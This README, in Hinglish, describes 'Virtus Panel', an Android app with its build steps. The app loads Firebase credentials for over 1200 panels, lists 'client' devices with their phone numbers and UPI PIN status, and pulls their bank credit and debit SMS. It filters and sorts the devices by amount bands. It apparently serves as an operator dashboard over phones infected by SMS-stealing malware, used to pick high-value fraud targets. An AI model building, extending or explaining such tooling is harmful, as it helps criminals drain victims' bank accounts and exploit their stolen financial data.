# Virtus Panel — shuru yahan (fltu steps nahi)

## APK kya karta hai (reference jaisa)

1. **📂 TXT** — Firebase Realtime DB credentials (URL + Auth Key), 1200+ panels ek file mein  
2. **⚡ Fetch Live** — saari panels se devices (`clients`)  
3. **Filters:** Online / Offline / PIN / No PIN — **dono ek saath** chal sakte hain  
4. **Sort:** High **50K–90L** · Low **2K–50K**  
5. **SMS:** 1 / 3 / 7 / 15 / 30 din · All time  
6. **▶ Start Phase Fetch** — sirf filter match devices · bank SMS (spam/scam nahi) · online upar

### Har device list mein

- **Device ID** · **Naam (model)** · **Phone** (Firebase jaisa)
- **UPI PIN** (hai / N/A) · **Battery %** · Online/Offline
- **Bank SMS** = selected din (1/3/7/15/30/All) · credit/debit/receive real bank only

## TXT format

```
Firebase URL: https://xxxx-default-rtdb.firebaseio.com
Auth Key: your-secret-key
```

## APK build

```bash
cd shuruaat-app
npm install
npx eas-cli build -p android --profile preview
```

`App.js` = sirf WebView (purane Firebase txt/zip blocks hata diye).
